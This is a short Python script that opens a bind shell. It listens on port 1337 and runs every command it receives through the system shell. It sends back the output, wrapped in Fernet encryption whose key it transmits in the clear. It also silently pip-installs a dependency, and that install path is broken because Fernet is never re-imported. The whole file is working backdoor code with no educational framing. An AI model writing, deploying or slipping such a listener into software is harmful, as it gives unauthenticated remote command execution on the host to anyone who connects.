import os
import subprocess
import socket

try:
	from cryptography.fernet import Fernet
except:
	os.system("pip install cryptography > /dev/null")

key = Fernet.generate_key()
cipher_suite = Fernet(key)

HOST = ''                 # Symbolic name meaning all available interfaces
PORT = 1337               # Arbitrary non-privileged port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
#print 'Connected by', addr
conn.sendall(key)
while 1:
    data = conn.recv(1024)
    if not data: break
    datad=cipher_suite.decrypt(data)
    proc = subprocess.Popen(datad, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout_value = proc.stdout.read() + proc.stderr.read()
    stde=cipher_suite.encrypt(stdout_value)
    conn.sendall(stde)
conn.close()
